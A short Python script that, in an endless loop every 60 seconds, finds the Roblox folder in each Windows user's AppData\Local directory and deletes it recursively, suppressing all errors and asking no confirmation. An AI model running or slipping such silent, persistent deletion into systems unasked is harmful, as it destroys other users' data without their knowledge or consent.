import os
import shutil
import glob
import time

def delete_roblox_folder(path):
    try:
        shutil.rmtree(path)
    except Exception:
        pass

def check_and_delete():
    roblox_paths = glob.glob(r"C:\Users\*\AppData\Local\Roblox")
    for roblox_dir in roblox_paths:
        if os.path.exists(roblox_dir):
            delete_roblox_folder(roblox_dir)

if __name__ == "__main__":
    while True:
        check_and_delete()
        time.sleep(60)